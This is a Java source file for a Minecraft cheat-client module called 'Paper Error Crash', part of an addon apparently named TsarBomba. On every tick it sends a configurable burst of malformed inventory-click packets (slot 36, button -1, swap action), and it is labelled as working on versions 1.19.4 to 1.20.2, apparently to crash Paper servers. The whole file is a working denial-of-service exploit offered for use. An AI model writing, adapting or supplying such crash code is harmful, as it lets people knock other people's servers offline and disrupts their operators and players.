package me.reich.tsarbomba.modules.crash;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import me.reich.tsarbomba.TsarBomba;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;

public class ErrorCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("Packets")
        .description("How many packets to send to the server.")
        .defaultValue(6)
        .sliderRange(1, 40)
        .build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("Auto Disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build());

    public ErrorCrash() {
        super(TsarBomba.CATEGORY, "Paper Error Crash", "works on 1.19.4~1.20.2");
    }

    @EventHandler
    public void onTick(TickEvent.Pre tickEvent) {
        var handler = mc.player.currentScreenHandler;
        Int2ObjectArrayMap<ItemStack> itemMap = new Int2ObjectArrayMap<>();
        itemMap.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
        for (int i = 0; i < packets.get(); i++) {
            mc.player.networkHandler.sendPacket(
                new ClickSlotC2SPacket(
                    handler.syncId,
                    handler.getRevision(),
                    36,
                    -1,
                    SlotActionType.SWAP,
                    handler.getCursorStack().copy(),
                    itemMap
                )
            );
        }

    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}
